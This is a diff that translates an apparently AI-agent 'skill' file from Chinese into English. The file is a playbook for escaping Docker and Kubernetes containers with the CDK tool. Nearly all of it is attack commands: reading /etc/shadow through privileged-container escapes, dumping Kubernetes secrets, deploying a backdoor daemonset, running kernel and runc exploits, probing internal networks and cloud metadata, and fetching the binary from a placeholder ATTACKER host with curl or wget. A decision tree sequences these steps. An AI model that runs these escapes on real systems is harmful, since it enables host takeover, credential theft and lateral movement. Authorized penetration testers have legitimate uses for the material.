@@ -1,49 +1,54 @@
 ---
 name: cdk-escape
-description: "使用 CDK 进行容器环境渗透和逃逸。当已进入容器环境（Docker/K8s Pod）需要评估逃逸可能性、利用容器漏洞、或进行容器内信息收集时使用。CDK 集成了容器环境评估、多种逃逸技术（privileged/mount/cgroup/lxcfs/runc/内核漏洞）、容器内横向移动。拿到容器 shell 后第一步就应该运行 CDK 评估。涉及容器逃逸、Docker 渗透、K8s 安全、容器提权的场景使用此技能"
+description: "Use CDK for container environment penetration testing and escape. Use once you are inside a container environment (Docker/K8s pod) and need to assess escape possibilities, exploit container vulnerabilities, or perform in-container information gathering. CDK integrates container environment assessment, multiple escape techniques (privileged/mount/cgroup/lxcfs/runc/kernel exploits), and in-container lateral movement. The first step after getting a container shell should be running CDK for assessment. Use this skill for container escape, Docker penetration, K8s security, and container privilege escalation scenarios"
+zh-signals: "使用 CDK 在容器环境中做信息收集、漏洞评估与逃逸利用，覆盖 Docker 与 K8s 场景。信号:容器逃逸,CDK,Docker,K8s,容器提权"
+when-to-use: >-
+  Use after gaining a container shell when assessing escape possibilities, exploiting
+  container vulnerabilities, or performing in-container information gathering across
+  Docker and Kubernetes.
 metadata:
-  tags: "cdk,container,docker,kubernetes,k8s,escape,逃逸,容器,privileged,cgroup,runc,pod"
+  tags: "cdk,container,docker,kubernetes,k8s,escape,container-escape,privileged,cgroup,runc,pod"
   category: "tool"
 ---
 
-# CDK 容器渗透与逃逸
+# CDK Container Penetration and Escape
 
-CDK 是容器渗透的瑞士军刀——**一个二进制解决容器内信息收集、漏洞检测、逃逸利用**。拿到容器 shell 后，先跑 CDK 评估，再选逃逸路径。
+CDK is the Swiss army knife of container penetration — **a single binary covering in-container information gathering, vulnerability detection, and escape exploitation**. After getting a container shell, run the CDK assessment first, then pick an escape path.
 
-项目地址：https://github.com/cdk-team/CDK
+Project address: https://github.com/cdk-team/CDK
 
-## 第一步：环境评估
+## Step 1: Environment Assessment
 
-进入容器后立即运行评估，CDK 会自动检测所有可能的逃逸路径：
+Run the assessment immediately after entering the container; CDK automatically detects all possible escape paths:
 
 ```bash
-# 全自动评估（推荐首选）
+# Fully automatic assessment (recommended first choice)
 cdk evaluate
 
-# 评估输出会列出：
-# - 容器运行时类型（Docker/containerd/CRI-O）
-# - 容器权限（privileged/capabilities）
-# - 可利用的挂载点
-# - 可用的逃逸技术
+# The assessment output lists:
+# - Container runtime type (Docker/containerd/CRI-O)
+# - Container permissions (privileged/capabilities)
+# - Exploitable mount points
+# - Available escape techniques
 # - K8s Service Account Token
-# - 网络信息
+# - Network information
 ```
 
-## 逃逸技术
+## Escape Techniques
 
-### 特权容器逃逸
+### Privileged Container Escape
 
 ```bash
-# 检测到 privileged=true 时
+# When privileged=true is detected
 cdk run mount-cgroup "cat /etc/shadow"
-# 或
+# or
 cdk run mount-disk
 
-# 通过 /dev 设备逃逸
+# Escape via /dev devices
 cdk run mount-procfs "cat /etc/shadow"
 ```
 
-### capabilities 逃逸
+### Capabilities Escape
 
 ```bash
 # CAP_SYS_ADMIN
@@ -54,29 +59,29 @@ cdk run cap-dac-read-search
 
 # CAP_SYS_PTRACE
 cdk run check-ptrace
-cdk run shim-pwn  # containerd-shim 提权
+cdk run shim-pwn  # containerd-shim privilege escalation
 ```
 
-### Docker Socket 逃逸
+### Docker Socket Escape
 
 ```bash
-# 发现挂载了 /var/run/docker.sock
+# When /var/run/docker.sock is found mounted
 cdk run docker-sock-check
 cdk run docker-sock-deploy "attacker_image"
 ```
 
-### K8s 逃逸
+### K8s Escape
 
 ```bash
-# 利用 Service Account Token
+# Leverage the Service Account Token
 cdk run k8s-secret-dump
 cdk run k8s-configmap-dump
 
-# 创建特权 Pod 逃逸
+# Create a privileged pod to escape
 cdk run k8s-backdoor-daemonset
 ```
 
-### 内核漏洞逃逸
+### Kernel Exploit Escape
 
 ```bash
 # CVE-2021-22555 (Netfilter)
@@ -89,41 +94,41 @@ cdk run exploit-CVE-2022-0847
 cdk run runc-pwn
 ```
 
-## 容器内信息收集
+## In-Container Information Gathering
 
 ```bash
-# 扫描内网服务（容器网络内）
+# Scan internal network services (within the container network)
 cdk run service-probe 10.0.0.0/24
 
-# 探测 K8s API Server
+# Probe the K8s API server
 cdk run k8s-service-discovery
 
-# 获取元数据服务（云环境）
+# Retrieve the metadata service (cloud environments)
 cdk run cloud-metadata
 ```
 
-## 工具投递
+## Tool Delivery
 
-CDK 是静态编译的单二进制文件，投递到容器很方便：
+CDK is a statically compiled single binary, so delivering it into a container is easy:
 
 ```bash
-# 方式 1：通过 Web 漏洞下载
+# Method 1: download through a web vulnerability
 curl -o /tmp/cdk https://ATTACKER/cdk && chmod +x /tmp/cdk
 
-# 方式 2：通过 Python 临时 HTTP 服务
-# 攻击机：python3 -m http.server 8000
-# 容器内：wget http://ATTACKER:8000/cdk -O /tmp/cdk && chmod +x /tmp/cdk
+# Method 2: via a temporary Python HTTP server
+# Attacker machine: python3 -m http.server 8000
+# Inside the container: wget http://ATTACKER:8000/cdk -O /tmp/cdk && chmod +x /tmp/cdk
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-进入容器后：
-├─ 第一步：cdk evaluate（自动评估所有逃逸路径）
+After entering the container:
+├─ Step 1: cdk evaluate (automatically assess all escape paths)
 ├─ privileged=true → cdk run mount-cgroup / mount-disk
-├─ 有 docker.sock → cdk run docker-sock-deploy
-├─ 有 K8s SA Token → cdk run k8s-secret-dump
-├─ 有 capabilities → 对应 capability 的利用
-├─ 以上都没有 → 检查内核版本，尝试内核漏洞
-└─ 也逃不了 → 容器内横向（service-probe 扫网段）
+├─ docker.sock present → cdk run docker-sock-deploy
+├─ K8s SA Token present → cdk run k8s-secret-dump
+├─ capabilities present → exploit the matching capability
+├─ none of the above → check the kernel version and try kernel exploits
+└─ still no escape → lateral movement inside the container (service-probe the network segment)
 ```
